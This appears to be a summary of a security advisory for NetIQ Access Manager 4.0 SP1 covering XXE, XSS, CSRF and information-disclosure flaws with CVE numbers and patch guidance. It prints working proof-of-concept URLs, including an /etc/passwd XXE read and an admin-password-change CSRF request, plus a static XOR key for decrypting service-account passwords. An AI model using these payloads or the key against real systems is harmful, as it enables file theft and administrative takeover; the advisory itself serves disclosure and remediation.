## Vulnerabilities in NetIQ Access Manager

Here's a summary of the vulnerabilities discussed in the provided text:

1.  **XML eXternal Entity Injection (XXE, CVE-2014-5214)**

    *   **Root Cause:** Authenticated administrative users can inject XML entities to download arbitrary files.
    *   **Attack Vector:**  Crafted URL with a `taskId` parameter exploiting `fw.PreviewObjectFilter`.
    *   **Impact:**  Arbitrary file download as the `novlwww` user.
    *   **Required Capabilities:** Authenticated administrative user.
    *   **Example:**

        ```
        https://<host>:8443/nps/servlet/webacc?taskId=fw.PreviewObjectFilter&nextState=initialState&merge=fw.TCPreviewFilter&query=<!DOCTYPE+request+[%0a<!ENTITY+include+SYSTEM+"/etc/passwd">%0a]><query><container>%26include%3b</container><subclasses>false</subclasses></query>
        ```

2.  **Reflected Cross Site Scripting (XSS, CVE-2014-5216)**

    *   **Root Cause:** Multiple reflected XSS vulnerabilities exist in the administration and user interfaces.
    *   **Attack Vector:** Crafted URLs with malicious JavaScript in parameters such as `location`, `xss`, and `error`.
    *   **Impact:**  Allows attacks on administrative and SSLVPN sessions.
    *   **Required Capabilities:**  Ability to entice a user to click a malicious link.
    *   **Examples:**

        ```
        https://<host>:8443/nps/servlet/webacc?taskId=dev.Empty&merge=dm.GenericTask&location=/roma/jsp/admin/view/main.jss'%2balert+('xss')%2b'
        https://<host>:8443/roma/jsp/debug/debug.jsp?xss=%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
        https://<host>:8443//nps/servlet/webacc?taskId=debug.DumpAll&xss=%3Cimg%20src=%22/404%22%20onerror=%22alert+%28%27xss%27%29%22%3E
        https://<host>/nidp/jsp/x509err.jsp?error=%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
        https://<host>/sslvpn/applet_agent.jsp?lang=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
        ```

3.  **Persistent Site Scripting (XSS, CVE-2014-5216)**

    *   **Root Cause:** A persistent XSS vulnerability exists.
    *   **Attack Vector:** Injecting a script on the auditing page.
    *   **Impact:** Allows attacks on administrative and SSLVPN sessions.
    *   **Required Capabilities:** Authenticated access to the auditing page.
    *   **Example:**

        ```
        https://<host>:8443/roma/system/cntl?handler=dispatcher&command=auditsave&&secureLoggingServersA='){}};alert('xss');function+x(){if('&port=1289
        ```

4.  **Cross Site Request Forgery (CSRF, CVE-2014-5217)**

    *   **Root Cause:**  The Access Manager administration interface lacks CSRF protection.
    *   **Attack Vector:** Issuing a GET request to change the administrator password in the context of an authenticated administrator.
    *   **Impact:**  An attacker can change the administrator password without knowing the old password.
    *   **Required Capabilities:** Ability to entice an authenticated administrator to visit a malicious page.
    *   **Example:**

        ```
        https://<host>:8443/nps/servlet/webacc?taskId=fw.SetPassword&nextState=doSetPassword&merge=dev.GenConf&selectedObject=P%3Aadmin.novellP&single=admin.novell&SetPswdNewPassword=12345&SetPswdVerifyPassword=12345
        ```

5.  **Information Disclosure (CVE-2014-5215)**

    *   **Root Cause:**  Authenticated users can gain authentication information of internal administrative users.
    *   **Attack Vector:** Accessing specific URLs that disclose system properties.
    *   **Impact:**  Disclosure of sensitive information, including passwords for internal service accounts (after decryption).
    *   **Required Capabilities:** Authenticated access to the administration interface.
    *   **Examples:**

        ```
        https://<host>:8443/roma/jsp/volsc/monitoring/dev_services.jsp
        https://<host>:8443/roma/jsp/debug/debug.jsp
        ```

        The disclosed system properties include:

        ```
         com.volera.vcdn.monitor.password
         com.volera.vcdn.alert.password
         com.volera.vcdn.sync.password
         com.volera.vcdn.scheduler.password
         com.volera.vcdn.publisher.password
         com.volera.vcdn.application.sc.scheduler.password
         com.volera.vcdn.health.password
        ```

    *   A static string `"k~jd)*L2;93=Gjs"` is used to XOR these values, allowing decryption of the service account passwords.

## Combination of Vulnerabilities

The advisory notes that by combining all the listed vulnerabilities (CSRF, XSS, XXE), an unauthenticated, non-admin user can gain full access to the system.

## Affected Versions

NetIQ Access Manager version 4.0 SP1.

## Solution

Update to the latest version of Access Manager and implement workarounds mentioned in the provided KB articles. Specifically, applying Access Manager 4.0.1 HF3 addresses most of the issues.

## Additional Notes

The advisory also mentions that two of the reflected XSS vulnerabilities (in `debug.jsp` and `debug.DumpAll`) require the admin user to be logged in before accessing the URLs. The vendor considers these to be lower priority and plans to fix them in a later release (NAM 4.1).
